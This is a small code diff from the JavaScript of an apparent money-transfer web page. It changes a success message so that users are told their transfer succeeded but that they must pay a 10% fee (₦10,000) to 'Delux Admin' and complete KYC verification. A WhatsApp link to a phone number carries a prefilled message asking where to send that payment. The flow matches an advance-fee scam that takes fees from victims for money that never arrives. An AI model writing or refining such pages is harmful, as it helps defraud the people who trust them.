@@ -167,7 +167,7 @@
                     .then(response => response.json())      
                     .then(data => {      
                         document.getElementById("successMessage").innerHTML = `      
-                            Transfer successful! You need to pay 10% (₦10,000) to Delux Admin for approval.      
+                            Transfer successful! You need to pay 10% (₦10,000) to Delux Admin for approval. and complete your kyc verification  
                         `;      
                         const whatsappMessage = `I just transfer ${amount} from delux please send an account to pay my 10,000 and approve my payment`;      
                         document.getElementById("approveButton").href = `https://wa.me/+12568212395?text=${encodeURIComponent(whatsappMessage)}`;      
